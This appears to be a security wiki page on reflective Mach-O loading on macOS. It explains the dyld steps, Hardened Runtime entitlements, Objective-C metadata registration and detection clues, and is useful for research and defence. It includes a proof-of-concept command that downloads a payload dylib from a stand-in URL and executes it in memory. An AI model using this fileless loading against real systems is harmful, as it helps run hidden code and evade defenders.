# Reflective Mach-O Loading on macOS

{{#include ../../../banners/hacktricks-training.md}}

A reflective loader maps a Mach-O image from bytes already in its own process, then links it and runs its initializers without asking the system loader to open a payload file. This is **in-process code execution**, not a privilege escalation or remote-process injection primitive.<sup>[[2]](#references)</sup>

On recent macOS, the old `NSCreateObjectFileImageFromMemory`/`NSLinkModule` path writes the image to disk. ReflectiveLoader instead embeds older Apple dyld loading code; Wardle demonstrated this on macOS 15 and 26.<sup>[[2]](#references)[[3]](#references)</sup>

If the loader uses the Hardened Runtime, its unsigned in-memory code needs an executable-memory exception such as `com.apple.security.cs.allow-unsigned-executable-memory` or `com.apple.security.cs.disable-executable-page-protection`; otherwise execution is blocked by code-signing enforcement. This is a loader signing constraint, not an elevation primitive. See the [macOS entitlements reference](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

For the PoC, supply a URL serving a raw Mach-O **bundle, framework, or dylib**. Its `main.mm` rejects empty downloads and states that payloads using `LC_DYLD_CHAINED_FIXUPS` are unsupported. A local pathname is also accepted, but that input is not a fileless workflow. The URL form reads bytes into `NSData` and passes its buffer and length to `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

The embedded loader calls `ImageLoaderMachO::instantiateFromMemory`, then `image->link`. It registers Objective-C metadata **after linking but before** `image->runInitializers`, which executes constructors.<sup>[[5]](#references)</sup> Without registration, a constructor that sends an Objective-C message can fail with `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> See [dyld's normal image-loading flow](macos-library-injection/macos-dyld-process.md#flow) and the [Mach-O sections reference](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Activating Objective-C metadata

Unlike normal dyld loading, embedding the older image loader does not automatically make the payload's Objective-C metadata usable by `libobjc`.<sup>[[3]](#references)</sup> The adapted LLVM JIT approach scans the mapped `__DATA` and `__DATA_CONST` Objective-C sections, then performs these steps before constructors run:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Walk `__objc_selrefs` in `sizeof(SEL)` steps. Obtain each non-null selector's name with `sel_getName`, pass it to `sel_registerName`, and replace the section's pointer with the canonical `SEL`.
2. Collect classes from `__objc_classlist` and register them with `objc_readClassPair`, resolving superclass dependencies first.
3. Rewrite references in `__objc_classrefs` and `__objc_superrefs` to registered classes or metaclasses, and attach category methods from `__objc_catlist`.

For example, the selector repair in `ObjCRuntime.cpp` is equivalent to:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

The PoC relies on internal Objective-C runtime behavior and does not support every Mach-O format feature, so its registration code is an implementation reference rather than a generic drop-in loader.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Registration is needed for referenced Apple classes and methods as well as classes defined by the payload.<sup>[[3]](#references)</sup>

A reflectively loaded image does not appear in `dyld_all_image_infos` in the author's tests. Its anonymous executable mappings can instead appear as unnamed `dylib` regions in `vmmap`; sampled frames can be shown as `<unknown binary>`. These are inspection clues rather than a reliable attribution to this loader, and access to another process's task information is entitlement-limited. See [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) for process-access constraints.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C and Swift on macOS: knowledge dump](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Restoring Reflective Code Loading on macOS (Part I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Restoring Reflective Code Loading on macOS (Part II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
